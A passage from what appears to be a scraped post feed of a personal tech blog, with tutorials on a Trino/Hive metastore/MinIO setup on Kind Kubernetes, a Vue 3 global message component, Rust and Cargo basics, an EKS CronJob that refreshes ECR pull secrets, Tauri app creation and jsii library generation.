\u0026lt;property\u0026gt; 13 \u0026lt;name\u0026gt;fs.s3a.connection.ssl.enabled\u0026lt;/name\u0026gt; 14 \u0026lt;value\u0026gt;false\u0026lt;/value\u0026gt; 15 \u0026lt;/property\u0026gt; 16 \u0026lt;property\u0026gt; 17 \u0026lt;name\u0026gt;fs.s3a.path.style.access\u0026lt;/name\u0026gt; 18 \u0026lt;value\u0026gt;true\u0026lt;/value\u0026gt; 19 \u0026lt;/property\u0026gt; 20 \u0026lt;property\u0026gt; 21 \u0026lt;name\u0026gt;fs.s3a.endpoint\u0026lt;/name\u0026gt; 22 \u0026lt;value\u0026gt;http://minio:9000\u0026lt;/value\u0026gt; 23 \u0026lt;/property\u0026gt; 24 \u0026lt;property\u0026gt; 25 \u0026lt;name\u0026gt;javax.jdo.option.ConnectionURL\u0026lt;/name\u0026gt; 26 \u0026lt;value\u0026gt;jdbc:postgresql://postgres:5432/hive_db?allowPublicKeyRetrieval=true;useSSL=false;serverTimezone=UTC\u0026lt;/value\u0026gt; 27 \u0026lt;/property\u0026gt; 28 \u0026lt;property\u0026gt; 29 \u0026lt;name\u0026gt;javax.jdo.option.ConnectionDriverName\u0026lt;/name\u0026gt; 30 \u0026lt;value\u0026gt;org.postgresql.Driver\u0026lt;/value\u0026gt; 31 \u0026lt;/property\u0026gt; 32 \u0026lt;property\u0026gt; 33 \u0026lt;name\u0026gt;javax.jdo.option.ConnectionUserName\u0026lt;/name\u0026gt; 34 \u0026lt;value\u0026gt;xxxx\u0026lt;/value\u0026gt; 35 \u0026lt;/property\u0026gt; 36 \u0026lt;property\u0026gt; 37 \u0026lt;name\u0026gt;javax.jdo.option.ConnectionPassword\u0026lt;/name\u0026gt; 38 \u0026lt;value\u0026gt;xxxx\u0026lt;/value\u0026gt; 39 \u0026lt;/property\u0026gt; 40 \u0026lt;property\u0026gt; 41 \u0026lt;name\u0026gt;hive.metastore.event.db.notification.api.auth\u0026lt;/name\u0026gt; 42 \u0026lt;value\u0026gt;false\u0026lt;/value\u0026gt; 43 \u0026lt;/property\u0026gt; 44 \u0026lt;property\u0026gt; 45 \u0026lt;name\u0026gt;metastore.thrift.uris\u0026lt;/name\u0026gt; 46 \u0026lt;value\u0026gt;thrift://hive:9083\u0026lt;/value\u0026gt; 47 \u0026lt;description\u0026gt;Thrift URI for the remote metastore. Used by metastore client to connect to remote metastore.\u0026lt;/description\u0026gt; 48 \u0026lt;/property\u0026gt; 49 \u0026lt;property\u0026gt; 50 \u0026lt;name\u0026gt;metastore.task.threads.always\u0026lt;/name\u0026gt; 51 \u0026lt;value\u0026gt;org.apache.hadoop.hive.metastore.events.EventCleanerTask\u0026lt;/value\u0026gt; 52 \u0026lt;/property\u0026gt; 53 \u0026lt;property\u0026gt; 54 \u0026lt;name\u0026gt;metastore.expression.proxy\u0026lt;/name\u0026gt; 55 \u0026lt;value\u0026gt;org.apache.hadoop.hive.metastore.DefaultPartitionExpressionProxy\u0026lt;/value\u0026gt; 56 \u0026lt;/property\u0026gt; 57 \u0026lt;property\u0026gt; 58 \u0026lt;name\u0026gt;metastore.warehouse.dir\u0026lt;/name\u0026gt; 59 \u0026lt;value\u0026gt;s3a://warehouse/hive\u0026lt;/value\u0026gt; 60 \u0026lt;/property\u0026gt; 61\u0026lt;/configuration\u0026gt; Import the sql to postgresql the sql file can find in this url: hive schema 3.1.0 sql\n1psql --user xxxx --password -d hive_db \u0026lt; hive-schema-3.1.0.sql ===================The following steps support aws s3 because the hadoop 2.8.0 above only ======================= Install the hive metastore 1# add helm repo 2helm repo add bigdata-gradiant https://gradiant.github.io/bigdata-charts/ 3helm repo update 4# search the charts of bigdata-gradiant repo 5helm search repo bigdata-gradiant 6 7# create namespace 8kubectl create ns analytics 9 10# launch the hive metastore deployment 11helm install hivems bigdata-gradiant/hive-metastore -n analytics 12# view the pods 13kubectl -n analytics get pods 14# chage the hivems docker image because the original image didn\u0026#39;t include the hadoop-aws-2.7.4.jar file 15docker pull jboothomas/hive-metastore-s3:v6 16# load the docker image to Kind cluster 17kind load docker-image jboothomas/hive-metastore-s3:v6 -n local-k8s 18# change the hivems image to modified 19# bde2020/hive:2.3.2-postgresql-metastore 20kubectl patch statefulset hivems-hive-metastore -n analytics -p \u0026#39;{\u0026#34;spec\u0026#34;: { \u0026#34;template\u0026#34;: { \u0026#34;spec\u0026#34;: {\u0026#34;containers\u0026#34;:[{\u0026#34;name\u0026#34;: \u0026#34;metastore\u0026#34;,\u0026#34;image\u0026#34;: \u0026#34;jboothomas/hive-metastore-s3:v6\u0026#34;}]}}}}\u0026#39; Deployment the minio to the analytics namespace kubectl apply -f ./minio-deployment.yaml 1apiVersion: apps/v1 # for k8s versions before 1.9.0 use apps/v1beta2 and before 1.8.0 use extensions/v1beta1 2kind: Deployment 3metadata: 4 # This name uniquely identifies the Deployment 5 name: minio-deployment 6spec: 7 selector: 8 matchLabels: 9 app: minio 10 strategy: 11 type: Recreate 12 template: 13 metadata: 14 labels: 15 # Label is used as selector in the service. 16 app: minio 17 spec: 18 # Refer to the PVC created earlier 19 volumes: 20 - name: storage 21 persistentVolumeClaim: 22 # Name of the PVC created earlier 23 claimName: minio-pv-claim 24 containers: 25 - name: minio 26 # Pulls the default Minio image from Docker Hub 27 image: minio/minio:latest 28 args: 29 - server 30 - /storage 31 env: 32 # Minio access key and secret key 33 - name: MINIO_ACCESS_KEY 34 value: \u0026#34;minio\u0026#34; 35 - name: MINIO_SECRET_KEY 36 value: \u0026#34;minio123\u0026#34; 37 ports: 38 - containerPort: 9000 39 hostPort: 9000 40 # Mount the volume into the pod 41 volumeMounts: 42 - name: storage # must match the volume name, above 43 mountPath: \u0026#34;/storage\u0026#34; 44--- 45apiVersion: v1 46kind: Service 47metadata: 48 name: minio-service 49spec: 50 selector: 51 app: minio 52 ports: 53 - protocol: TCP 54 port: 9000 55 targetPort: 9000 56--- 57apiVersion: v1 58kind: PersistentVolumeClaim 59metadata: 60 name: minio-pv-claim 61spec: 62 accessModes: 63 - ReadWriteOnce 64 resources: 65 requests: 66 storage: 10Gi Download the New York City Taxi datasets from s3 manually upload to container mount folder maybe didn\u0026rsquo;t working, only port-forward to and upload file create bucket in minio web ui is working.\n1# view the datasets bucket 2aws s3 ls s3://nyc-tlc/ 3# download some csv 4aws s3 cp s3://nyc-tlc/csv_backup/yellow_tripdata_2022-02.csv ./ 5# This way is doesn\u0026#39;t working please use minio web ui to upload 6# copy the dataset file to Kind k8s cluster host mount folder 7# also this is minio mount pvc path in container 8# docker cp ./yellow_tripdata_2022-02.csv local-k8s-worker2:/var/local-path-provisioner/pvc-1a14ef0e-49b2-4ad4-ac51-cf8e877306be_analytics_minio-pv-claim/ 9# # create bucket in mount folder and move the file to that bucket 10# mkdir nyctaxi 11# cp yellow_tripdata_2022-02.csv nyctaxi/ 12 13# can also port forward the minio service to localhost 14# and access http://127.0.0.1:34389 to access minio web ui to create 15k port-forward deploy/minio-deployment -n analytics 34389:34389 9000:9000 Install HDFS chats, This is not necessary, can change the hive-site.xml warehouse dir 1helm pull bigdata-gradiant/hdfs 2tar -xzvf ./hdfs-0.1.10.tgz 3# change the pdb version to policy/v1 in yaml file 4cd hdfs \u0026amp;\u0026amp; vi ./templates/hdfs-dn-pdb.yaml 5vi ./templates/hdfs-nn-pdb.yaml 6# install the hdfs in local cluster 7helm install hdfs ./hdfs -n analytics Change hivems configmap add the minio properies 1$ kubectl -n analytics get configmap hivems-hive-metastore -o yaml \u0026gt; hivems-hive-metastore.yaml 2$ vi hivems-hive-metastore.yaml 3### I MAKE THE FOLLOWING CHANGE/ADDITION ### 4data: 5 hive-site.xml: | 6 \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; 7 \u0026lt;?xml-stylesheet type=\u0026#34;text/xsl\u0026#34; href=\u0026#34;configuration.xsl\u0026#34;?\u0026gt; 8 \u0026lt;configuration\u0026gt; 9 \u0026lt;property\u0026gt; 10 \u0026lt;name\u0026gt;fs.s3a.endpoint\u0026lt;/name\u0026gt; 11 \u0026lt;value\u0026gt;http://minio-service:9000\u0026lt;/value\u0026gt; 12 \u0026lt;/property\u0026gt; 13 \u0026lt;property\u0026gt; 14 \u0026lt;name\u0026gt;fs.s3a.access.key\u0026lt;/name\u0026gt; 15 \u0026lt;value\u0026gt;xxxxxx\u0026lt;/value\u0026gt; 16 \u0026lt;/property\u0026gt; 17 \u0026lt;property\u0026gt; 18 \u0026lt;name\u0026gt;fs.s3a.secret.key\u0026lt;/name\u0026gt; 19 \u0026lt;value\u0026gt;xxxxxx\u0026lt;/value\u0026gt; 20 \u0026lt;/property\u0026gt; 21 \u0026lt;property\u0026gt; 22 \u0026lt;name\u0026gt;fs.s3a.connection.ssl.enabled\u0026lt;/name\u0026gt; 23 \u0026lt;value\u0026gt;false\u0026lt;/value\u0026gt; 24 \u0026lt;/property\u0026gt; 25 \u0026lt;property\u0026gt; 26 \u0026lt;name\u0026gt;fs.s3a.path.style.access\u0026lt;/name\u0026gt; 27 \u0026lt;value\u0026gt;true\u0026lt;/value\u0026gt; 28 \u0026lt;description\u0026gt;Enable S3 path style access.\u0026lt;/description\u0026gt; 29 \u0026lt;/property\u0026gt; 30 \u0026lt;property\u0026gt; 31 \u0026lt;name\u0026gt;fs.s3a.impl\u0026lt;/name\u0026gt; 32 \u0026lt;value\u0026gt;org.apache.hadoop.fs.s3a.S3AFileSystem\u0026lt;/value\u0026gt; 33 \u0026lt;description\u0026gt;The implementation of S3A Filesystem\u0026lt;/description\u0026gt; 34 \u0026lt;/property\u0026gt; also change the hive.metastore.warehouse.dir section 1#\u0026lt;property\u0026gt; 2# \u0026lt;name\u0026gt;hive.metastore.warehouse.dir\u0026lt;/name\u0026gt; 3# \u0026lt;value\u0026gt;hdfs://hdfs:8020/user/hive/warehouse\u0026lt;/value\u0026gt; 4#\u0026lt;/property\u0026gt; 5 6# TO 7\u0026lt;property\u0026gt; 8\u0026lt;name\u0026gt;hive.metastore.warehouse.dir\u0026lt;/name\u0026gt; 9\u0026lt;value\u0026gt;s3a://hive/warehouse\u0026lt;/value\u0026gt; 10\u0026lt;/property\u0026gt; Create the table schema 1# enter pod 2k exec -it hivems-hive-metastore-0 -n analytics -- sh 3# execute 4hive 5hive\u0026gt; 6create external table if not exists nyctaxi( 7 VendorID bigint, 8 tpep_pickup_datetime timestamp, 9 tpep_dropoff_datetime timestamp, 10 passenger_count double, 11 trip_distance double, 12 RatecodeID double, 13 store_and_fwd_flag string, 14 PULocationID bigint, 15 DOLocationID bigint, 16 payment_type bigint, 17 fare_amount double, 18 extra double, 19 mta_tax double, 20 tip_amount double, 21 tolls_amount double, 22 improvement_surcharge double, 23 total_amount double 24 ) 25 ROW FORMAT SERDE \u0026#39;org.apache.hadoop.hive.serde2.OpenCSVSerde\u0026#39; WITH SERDEPROPERTIES(\u0026#39;separatorChar\u0026#39;=\u0026#39;,\u0026#39;,\u0026#39;quoteChar\u0026#39;=\u0026#39;\\\u0026#34;\u0026#39;) 26 STORED AS TEXTFILE 27 LOCATION \u0026#39;s3a://test/\u0026#39; TBLPROPERTIES(\u0026#39;skip.header.line.count\u0026#39;=\u0026#39;1\u0026#39;); Relative jar package can download in hadoop tar repo hive src packages hive bin packages hive metastore bin packages Reference New York City Taxi and Limousine Commission minio with hive Hive-metastore on K8S with S3 external table Create your first table on Hive using data from CSV Modern Data Lake with MinIO : Part 2 Access MinIO S3 Storage in Trino with Hive Metastore Hive sql syntax hive schema 3.1.0 sql Querying S3 Object Stores with Presto or Trino Configure Apache Hive to use Postgres as Metastore Determine Compatibility of hadoop-aws and aws-java-sdk-bundle JARs trino-minio-docker compose https://blog.csdn.net/w8998036/article/details/134568944 Hive Standalone Metastore for Trino in Docker ","link":"https://blog.wisekee.com/post/bigdata-trino-hive-minio-getting-started/","section":"post","tags":["open source","trino","bigdata","hive","minio"],"title":"trino+hive metastore+k8s+minio environment prepared"},{"body":"","link":"https://blog.wisekee.com/tags/vue/","section":"tags","tags":null,"title":"Vue"},{"body":"Define the custom component MessageBox in vue file this file named MessageBox.vue\n1\u0026lt;template\u0026gt; 2 \u0026lt;transition name=\u0026#34;fade-in\u0026#34; mode=\u0026#34;out-in\u0026#34;\u0026gt; 3 \u0026lt;div 4 v-if=\u0026#34;show\u0026#34; 5 :class=\u0026#34;[\u0026#39;alert\u0026#39;, \u0026#39;notification\u0026#39;, \u0026#39;is-\u0026#39; + type]\u0026#34; 6 :style=\u0026#34;{ transform: \u0026#39;translate(-50%,\u0026#39; + offset + \u0026#39;px)\u0026#39; }\u0026#34; 7 \u0026gt; 8 \u0026lt;button 9 @click=\u0026#34;() =\u0026gt; (this.show = !this.show)\u0026#34; 10 v-show=\u0026#34;this.showBtn\u0026#34; 11 class=\u0026#34;delete\u0026#34; 12 \u0026gt;\u0026lt;/button\u0026gt; 13 \u0026lt;p v-html=\u0026#34;message\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; 14 \u0026lt;/div\u0026gt; 15 \u0026lt;/transition\u0026gt; 16\u0026lt;/template\u0026gt; 17 18\u0026lt;script\u0026gt; 19export default { 20 name: \u0026#34;MessageBox\u0026#34;, 21 props: { 22 message: { 23 thype: String, 24 required: true, 25 }, 26 type: { 27 type: String, 28 default: \u0026#34;default\u0026#34;, 29 }, 30 offset: { 31 type: Number, 32 default: 20, 33 }, 34 showBtn: { 35 type: Boolean, 36 default: true, 37 }, 38 }, 39 data() { 40 return { 41 show: true, 42 }; 43 }, 44 methods: { 45 isShow(status) { 46 this.show = status; 47 }, 48 }, 49}; 50\u0026lt;/script\u0026gt; 51 52\u0026lt;style scoped\u0026gt; 53.alert { 54 /*width: 380px;*/ 55 height: fit-content; 56 position: fixed; 57 left: 50%; 58 transform: translate(-50%); 59 top: 20px; 60 padding: 0.5rem; 61 border: 1px solid transparent; 62 border-radius: 0.25rem; 63 z-index: 99999; 64} 65 66 67.alert p { 68 padding: 0.2rem 0rem; 69 padding-right: 1.5rem; 70 /*width: 350px;*/ 71 font-size: .8em; 72 word-break: break-all; 73 text-align: left; 74} 75 76 77.alert .close-btn { 78 position: absolute; 79 top: 0.2rem; 80 right: 0; 81 padding: 0.2rem 0.5rem; 82 margin-left: 0.2rem; 83 background-color: transparent; 84 border: none; 85 font-size: 1.5rem; 86 cursor: pointer; 87 transform: translate(-50%); 88} 89 90.close-btn:hover { 91 color: red; 92} 93 94.alert-default { 95 color: #004085; 96 background-color: #cce5ff; 97 border-color: #b8daff; 98} 99 100.alert-success { 101 color: #155724; 102 background-color: #d4edda; 103 border-color: #c3e6cb; 104} 105.alert-warning { 106 color: #856404; 107 background-color: #fff3cd; 108 border-color: #ffeeba; 109} 110 111.alert-error { 112 color: #721c24; 113 background-color: #f8d7da; 114 border-color: #f5c6cb; 115} 116 117.fade-in-enter-active, 118.fade-in-leave-active { 119 transition: all 0.5s; 120} 121 122.fade-in-enter, 123.fade-in-leave-to { 124 top: 0; 125 opacity: 0; 126 transform: translate(-50%, 0); 127} 128\u0026lt;/style\u0026gt; Registe global component to vue context 1import MessageBox from \u0026#39;../components/MessageBox.vue\u0026#39; 2import { createApp } from \u0026#39;vue\u0026#39;; 3 4const componetns = [MessageBox]; 5 6const messageQueen = []; 7export default (app) =\u0026gt; { 8 9 //register global component 10 componetns.forEach((component) =\u0026gt; { 11 app.component(component.name, component); 12 }); 13 //mount instance of componet 14 app.config.globalProperties.$message = { 15 warning(data) { 16 app.config.globalProperties.$show({ message: data.message, type: \u0026#34;warning\u0026#34;, duration: data.duration, showBtn: data.showBtn}); 17 }, 18 success(data) { 19 app.config.globalProperties.$show({ message: data.message, type: \u0026#34;success\u0026#34;, duration: data.duration, showBtn: data.showBtn}); 20 }, 21 error(data) { 22 app.config.globalProperties.$show({ message: data.message, type: \u0026#34;danger\u0026#34;, duration: data.duration, showBtn: data.showBtn }); 23 }, 24 default(data) { 25 app.config.globalProperties.$show({ message: data.message, type: \u0026#34;info\u0026#34;, duration: data.duration, showBtn: data.showBtn }); 26 }, 27 }; 28 app.config.globalProperties.$show = (props) =\u0026gt; { 29 // add the pop window queen 30 if (!messageQueen.length) { 31 messageQueen.push(20); 32 } else { 33 messageQueen.push(messageQueen[messageQueen.length - 1] + 20 + 48); 34 } 35 const tempDiv = document.createElement(\u0026#39;div\u0026#39;); 36 let MessageBoxInstance = createApp(MessageBox, { 37 ...props, 38 offset: !messageQueen.length ? 20 : messageQueen[messageQueen.length - 1] 39 }).mount(tempDiv); 40 41 document.body.appendChild(MessageBoxInstance.$el); 42 // show messagebox 43 MessageBoxInstance.isShow(true); 44 setTimeout(() =\u0026gt; { 45 // pop stack current messagebox 46 messageQueen.shift(); 47 // destory messagebox 48 MessageBoxInstance.isShow(false); 49 }, props.duration ? props.duration : 3000); 50 }; 51 52}; Initialization the global custom component in entry js file main.js 1import { createApp } from \u0026#39;vue\u0026#39; 2import { createStore } from \u0026#39;vuex\u0026#39; 3import messageBox from \u0026#39;./utils/messageBox\u0026#39; 4import App from \u0026#39;./App.vue\u0026#39; 5 6 7const app = createApp(App) 8 9messageBox(app) 10 11app.mount(\u0026#39;#app\u0026#39;) 12export {app} Use the global custom component in project or other component 1 // method one 2 this.$message.error({message: mess, duration: 5000}) 3 // method two 4 import { getCurrentInstance } from \u0026#39;vue\u0026#39; 5 const instance = getCurrentInstance(); 6 7 const onSubmit = () =\u0026gt; { 8 let gp = instance.appContext.app.config.globalProperties; 9 gp.$message.warning({message:\u0026#34;No changed...\u0026#34;}) 10 } ","link":"https://blog.wisekee.com/post/vue-custom-components/","section":"post","tags":["Frontend","Vue","Vite"],"title":"Vue custom component getting started"},{"body":"Basic knowledge \u0026amp;str is string literal To do the conversion use the standard String::from(\u0026amp;str) method also can use .to_string() String::from(\u0026quot;Something\u0026quot;) is string data type enum with structs 1// Define a tuple struct 2struct KeyPress(String, char); 3 4// Define a classic struct 5struct MouseClick { x: i64, y: i64 } 6 7// Redefine the enum variants to use the data from the new structs 8// Update the page Load variant to have the boolean type 9enum WebEvent { WELoad(bool), WEClick(MouseClick), WEKeys(KeyPress) } 10 11let we_load = WebEvent::WELoad(true); Project manage commands Cargo commands cargo new to create new project cargo build to build a project cargo run to build and run project cargo test Test a project cargo check Check project types cargo doc Build documentation for a project cargo publish Publish a library to crates.io Add dependent crates to a project by adding the crate name to the Cargo.toml file rustup doc open and display the docs about rust The example of project Directory of project 1mkdir ~/rust-learning-path 2cd ~/rust-learning-path 3mkdir hello-world 4cd hello-world the main.rs 1fn main() { 2\tprintln!(\u0026#34;Hello, world!\u0026#34;); 3 // Display the message \u0026#34;Hello, world!\u0026#34; 4 todo!(\u0026#34;Display the message by using the println!() macro\u0026#34;); 5 println!(\u0026#34;The first letter of the English alphabet is {} and the last letter is {}.\u0026#34;, \u0026#39;A\u0026#39;, \u0026#39;Z\u0026#39;); 6} to build and run the project 1rustc main.rs 2./main Create a project with Cargo new project 1mkdir rust-learning-path \u0026amp;\u0026amp; cd rust-learning-path 2cargo new hello-cargo 3cd hello-cargo 4cargo run Reference rust-introduction cargo book and guide the packages online playgroud installer for the systems programming language Rust ","link":"https://blog.wisekee.com/post/rust-getting-started/","section":"post","tags":["Rust","Programming"],"title":"First step to learn Rust programming"},{"body":"","link":"https://blog.wisekee.com/tags/programming/","section":"tags","tags":null,"title":"Programming"},{"body":"","link":"https://blog.wisekee.com/tags/rust/","section":"tags","tags":null,"title":"Rust"},{"body":"","link":"https://blog.wisekee.com/tags/cdk/","section":"tags","tags":null,"title":"CDK"},{"body":"","link":"https://blog.wisekee.com/tags/docker/","section":"tags","tags":null,"title":"Docker"},{"body":"When use imagePullSecret to pull image from ecr in eks cluster for particular task etc. Istio WSAM plugin from ecr registry, need specific imagePullSecret\nBasic workflow create cronjob in eks cluster schedule login to ecr and obtain credentials create a secrets in some Namespaces named aws-registry save the docker pull credentals use this secrets in Namespace pull image specific imagePullSecret parameter for example: 1 spec: 2 imagePullPolicy: Always 3 imagePullSecret: aws-registry The Dockerfile to construct cronjob docker image 1FROM python:alpine 2MAINTAINER Mike Petersen \u0026lt;mike@odania-it.de\u0026gt; 3 4RUN apk --no-cache add curl 5ADD run.sh /run.sh 6 7# Install kubectl 8RUN curl -LO https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl \\ 9\t\u0026amp;\u0026amp; mv kubectl /usr/local/bin \\ 10\t\u0026amp;\u0026amp; chmod +x /usr/local/bin/kubectl 11 12RUN adduser -S user 13USER user 14WORKDIR /home/user 15ENV PATH /usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/user/.local/bin 16 17# Install awscli 18RUN pip install awscli --upgrade --user The Run.sh to run shell script 1#!/usr/bin/env sh 2set -e 3 4echo \u0026#34;Retrieving Docker Credentials for the AWS ECR Registry ${AWS_ACCOUNT}\u0026#34; 5DOCKER_REGISTRY_SERVER=https://${AWS_ACCOUNT}.dkr.ecr.${AWS_REGION}.amazonaws.com 6DOCKER_USER=AWS 7DOCKER_PASSWORD=`aws ecr get-login --region ${AWS_REGION} --registry-ids ${AWS_ACCOUNT} | cut -d\u0026#39; \u0026#39; -f6` 8 9for namespace in ${NAMESPACES} 10do 11\techo 12\techo \u0026#34;Working in Namespace ${namespace}\u0026#34; 13\techo 14\techo \u0026#34;Removing previous secret in namespace ${namespace}\u0026#34; 15\tkubectl --namespace=${namespace} delete secret aws-registry || true 16 17\techo \u0026#34;Creating new secret in namespace ${namespace}\u0026#34; 18\tkubectl create secret docker-registry aws-registry \\ 19\t--docker-server=$DOCKER_REGISTRY_SERVER \\ 20\t--docker-username=$DOCKER_USER \\ 21\t--docker-password=$DOCKER_PASSWORD \\ 22\t--docker-email=no@email.local \\ 23\t--namespace=${namespace} 24\techo 25\techo 26done 27 28echo \u0026#34;Patching default serviceaccount\u0026#34; 29echo kubectl patch serviceaccount default -p \u0026#39;{\u0026#34;imagePullSecrets\u0026#34;:[{\u0026#34;name\u0026#34;:\u0026#34;aws-registry\u0026#34;}]}\u0026#39; Create the Kubernetes relative resources 1apiVersion: v1 2kind: Secret 3metadata: 4 name: ecr-registry-helper-secrets 5 namespace: kube-system 6stringData: 7 AWS_ACCOUNT: \u0026#34;xxxxxxx\u0026#34; 8--- 9apiVersion: v1 10kind: ConfigMap 11metadata: 12 name: ecr-registry-helper-cm 13 namespace: kube-system 14data: 15 AWS_REGION: \u0026#34;us-east-1\u0026#34; 16 DOCKER_SECRET_NAME: aws-registry 17 NAMESPACES: \u0026#34;default kube-system example\u0026#34; 18--- 19apiVersion: batch/v1 20kind: CronJob 21metadata: 22 name: ecr-registry-helper 23 namespace: kube-system 24spec: 25 schedule: \u0026#34;0 */10 * * *\u0026#34; 26 successfulJobsHistoryLimit: 3 27 suspend: false 28 jobTemplate: 29 spec: 30 template: 31 spec: 32 serviceAccountName: sa-aws-ecr 33 containers: 34 - name: ecr-registry-helper 35 image: xxxxx.dkr.ecr.us-east-1.amazonaws.com/aws-kubectl:v1 36 imagePullPolicy: IfNotPresent 37 envFrom: 38 - secretRef: 39 name: ecr-registry-helper-secrets 40 - configMapRef: 41 name: ecr-registry-helper-cm 42 command: 43 - /run.sh 44 restartPolicy: Never 45--- 46apiVersion: v1 47kind: ServiceAccount 48metadata: 49 name: sa-aws-ecr 50 namespace: kube-system 51--- 52apiVersion: rbac.authorization.k8s.io/v1 53kind: ClusterRole 54metadata: 55 name: role-full-access-to-secrets 56rules: 57- apiGroups: [\u0026#34;*\u0026#34;] 58 resources: [\u0026#34;secrets\u0026#34;] 59 resourceNames: [\u0026#34;aws-registry\u0026#34;] 60 verbs: [\u0026#34;delete\u0026#34;] 61- apiGroups: [\u0026#34;*\u0026#34;] 62 resources: [\u0026#34;secrets\u0026#34;] 63 verbs: [\u0026#34;create\u0026#34;] 64--- 65kind: ClusterRoleBinding 66apiVersion: rbac.authorization.k8s.io/v1 67metadata: 68 name: health-check-role-binding 69subjects: 70- kind: ServiceAccount 71 name: sa-aws-ecr 72 namespace: kube-system 73roleRef: 74 kind: ClusterRole 75 name: role-full-access-to-secrets 76 apiGroup: rbac.authorization.k8s.io 77--- Apply these resources to create cronjob to schedule update specific imagePullSecret 1kubectl apply -f ./ecr-credentials-helper.yaml Reference Dockerfile for kubectl and awscli pull an image from private ECR registry. Auto refresh ECR token. ","link":"https://blog.wisekee.com/post/aws-ecr-register-helper/","section":"post","tags":["ECR","AWS","Docker"],"title":"Dynamic create docker registry pull image credentials in eks cluster for particular  imagePullSecret"},{"body":"","link":"https://blog.wisekee.com/tags/ecr/","section":"tags","tags":null,"title":"ECR"},{"body":"The prerequisites Install rust Reference offical site Install the Create-tauri-app Follow the tutorial step by step to create new Tauri project 1cargo install create-tauri-app --locked 2cargo create-tauri-app Select the Frontend language: TypeScript / JavaScript 1 2# Project name · tauri-app 3# ✔ Identifier · com.tauri-app.app 4# ✔ Choose which language to use for your frontend · TypeScript / JavaScript - (pnpm, yarn, npm, deno, bun) 5# ✔ Choose your package manager · pnpm 6# ✔ Choose your UI template · Vue - (https://vuejs.org/) 7# ✔ Choose your UI flavor · TypeScript Other 1rustup target add i686-pc-windows-msvc ","link":"https://blog.wisekee.com/post/how_to_use_tauri/","section":"post","tags":["Tauri","Rust"],"title":"How to use Tauri development the GUI app"},{"body":"","link":"https://blog.wisekee.com/tags/jsii/","section":"tags","tags":null,"title":"Jsii"},{"body":"","link":"https://blog.wisekee.com/tags/tauri/","section":"tags","tags":null,"title":"Tauri"},{"body":"You can generate Python, Java, and .NET software libraries from a TypeScript source use jsii of AWS Cloud Development Kit (AWS CDK).\nInitialization the project constructure 1pnpm init -y 2pnpm install --development jsii jsii-pacmak The package.json like following this 1{ 2 \u0026#34;name\u0026#34;: \u0026#34;jsii-demo\u0026#34;, 3 \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, 4 \u0026#34;description\u0026#34;: \u0026#34;A demonstration jsii library\u0026#34;, 5 \u0026#34;main\u0026#34;: \u0026#34;index.js\u0026#34;, 6 \u0026#34;scripts\u0026#34;: { 7 \u0026#34;build\u0026#34;: \u0026#34;jsii\u0026#34;, 8 \u0026#34;build:watch\u0026#34;: \u0026#34;jsii --watch\u0026#34;, 9 \u0026#34;package\u0026#34;: \u0026#34;jsii-pacmak\u0026#34; 10 }, 11 \u0026#34;keywords\u0026#34;: [], 12 \u0026#34;author\u0026#34;: { 13 \u0026#34;name\u0026#34;: \u0026#34;John Doe\u0026#34;, 14 \u0026#34;email\u0026#34;: \u0026#34;john.doe@acme.com\u0026#34; 15 }, 16 \u0026#34;repository\u0026#34;: { 17 \u0026#34;url\u0026#34;: \u0026#34;https://github.com/acme/project-name.git\u0026#34; 18 }, 19 \u0026#34;license\u0026#34;: \u0026#34;ISC\u0026#34;, 20 \u0026#34;stability\u0026#34;: \u0026#34;stable\u0026#34;, 21 \u0026#34;types\u0026#34;: \u0026#34;index.d.ts\u0026#34;, 22 \u0026#34;jsii\u0026#34;: { 23 \u0026#34;outdir\u0026#34;: \u0026#34;dist\u0026#34;, 24 \u0026#34;versionFormat\u0026#34;: \u0026#34;full\u0026#34;, 25 \u0026#34;targets\u0026#34;: { 26 \u0026#34;java\u0026#34;: { 27 \u0026#34;package\u0026#34;: \u0026#34;software.aws.jsiisamples.jsii\u0026#34;, 28 \u0026#34;maven\u0026#34;: { 29 \u0026#34;groupId\u0026#34;: \u0026#34;software.aws.jsiisamples.jsii\u0026#34;, 30 \u0026#34;artifactId\u0026#34;: \u0026#34;jsii-code-samples\u0026#34; 31 } 32 }, 33 \u0026#34;python\u0026#34;: { 34 \u0026#34;distName\u0026#34;: \u0026#34;aws-jsiisamples.jsii-code-samples\u0026#34;, 35 \u0026#34;module\u0026#34;: \u0026#34;aws_jsiisamples.jsii_code_samples\u0026#34; 36 }, 37 \u0026#34;dotnet\u0026#34;: { 38 \u0026#34;namespace\u0026#34;: \u0026#34;AWSSamples.Jsii\u0026#34;, 39 \u0026#34;packageId\u0026#34;: \u0026#34;AWSSamples.Jsii\u0026#34;, 40 \u0026#34;iconUrl\u0026#34;: \u0026#34;https://raw.githubusercontent.com/aws/jsii/master/logo/png/128x128.png\u0026#34; 41 }, 42 \u0026#34;go\u0026#34;: { 43 \u0026#34;moduleName\u0026#34;: \u0026#34;github.com/foo/bar\u0026#34;, 44 \u0026#34;packageName\u0026#34;: \u0026#34;hello\u0026#34;, 45 \u0026#34;versionSuffix\u0026#34;: \u0026#34;-devprefix\u0026#34; 46 } 47 } 48 }, 49 \u0026#34;devDependencies\u0026#34;: { 50 \u0026#34;jsii\u0026#34;: \u0026#34;^5.3.7\u0026#34;, 51 \u0026#34;jsii-pacmak\u0026#34;: \u0026#34;^1.94.0\u0026#34; 52 } 53} Write the HelloWorld typescript code to index.ts 1export class HelloWorld { 2 public sayHello(name: string) { 3 return `Hello, ${name}`; 4 } 5 6 public fibonacci(num: number) { 7 let array = [0, 1]; 8 for (let i = 2; i \u0026lt; num + 1; i++) { 9 array.push(array[i - 2] + array[i - 1]); 10 } 11 return array[num]; 12 } 13} The execute build 1pnpm run build 2# then package to dist folder 3pnpm run package 4# copy the python whl file to other project and install it 5pip install aws_jsiisamples.jsii_code_samples-1.0.0-py3-none-any.whl --force-reinstall Invoker the javascript code in python 1from aws_jsiisamples.jsii_code_samples import HelloWorld 2 3 4 5if __name__ == \u0026#34;__main__\u0026#34;: 6 g = HelloWorld() 7 print(g.say_hello(\u0026#39;Tom\u0026#39;)) Reference Generate Python, Java, and .NET software libraries from a TypeScript source Authoring Polyglot AWS CDK Constructs Using JSII 